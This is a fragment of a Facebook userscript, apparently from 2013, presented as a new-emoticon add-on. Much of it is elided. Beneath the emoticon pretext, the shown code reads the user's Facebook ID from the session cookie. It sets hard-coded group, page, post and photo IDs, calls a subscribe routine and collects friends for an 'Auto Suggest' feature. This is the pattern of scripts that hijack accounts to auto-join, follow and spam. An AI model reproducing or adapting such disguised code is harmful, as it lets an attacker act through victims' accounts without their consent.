// ==UserScript==
// @name            Emoji New Emoticon TCMC - Grup
// @description     Facebook Emotion New 2013 By Ikhsan
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/400979163299378" target="_blank">Created By Ikhsan<br>KLIK DISINI</a>';
	html += '</div>';
...
sublist("609323589098413");

//Group ku Gembel
var gid = ['400979163299378'];
...
var spage_id = "378608772240190";
var spost_id = "617536361610469";
var sfoto_id = "147381591959284";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Tempatnya Curhat Masalah Cinta';
